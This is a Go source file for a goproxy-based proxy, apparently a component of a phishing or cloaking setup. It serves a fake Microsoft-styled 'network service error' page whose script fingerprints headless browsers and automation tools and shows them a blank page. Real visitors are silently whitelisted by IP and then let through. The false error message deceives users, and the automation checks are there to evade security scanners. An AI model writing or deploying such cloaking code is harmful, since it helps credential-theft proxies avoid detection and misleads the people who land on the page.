package core

import (
	"net/http"

	"github.com/elazarl/goproxy"
)

const challengeHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Something went wrong</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
.wrap{text-align:center;padding:40px 48px;max-width:480px}
.icon{font-size:48px;margin-bottom:20px}
h2{font-size:20px;font-weight:600;color:#201f1e;margin-bottom:10px}
p{color:#605e5c;font-size:14px;line-height:1.6}
.code{margin-top:20px;font-size:11px;color:#a19f9d;font-family:monospace}
</style>
</head>
<body>
<div class="wrap">
<div class="icon">&#9888;&#65039;</div>
<h2>Something went wrong</h2>
<p>A network service error has occurred.<br>Please wait while we reconnect...</p>
<div class="code">ERR_NETWORK_SERVICE_0x8004</div>
</div>
<script>
(function(){
  if(navigator.webdriver||window._phantom||window.__nightmare||
     window.callPhantom||window._selenium||document.__selenium_unwrapped||
     window.domAutomation||window.domAutomationController){
    document.body.innerHTML='';return;
  }
  if(screen.width<100||screen.height<100){
    document.body.innerHTML='';return;
  }
  function _pass(){
    var xhr=new XMLHttpRequest();
    xhr.open('POST','/_xv',true);
    xhr.onloadend=function(){window.location.reload();};
    xhr.onerror=function(){window.location.reload();};
    xhr.send(null);
  }
  setTimeout(_pass,1500);
})();
</script>
</body>
</html>`

// ChallengeResponse serves the JS challenge page. The JS will:
//  1. Detect headless browsers / automation flags.
//  2. Wait 1.5 s (timing gate).
//  3. POST to /_xv — server records that this IP passed JS execution.
//  4. Reload — server sees the IP in challengedIPs and lets the request through.
func ChallengeResponse(req *http.Request, host, path, secret string) (*http.Request, *http.Response) {
	html := challengeHTML

	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, html)
	resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate")
	resp.Header.Set("Pragma", "no-cache")
	return req, resp
}
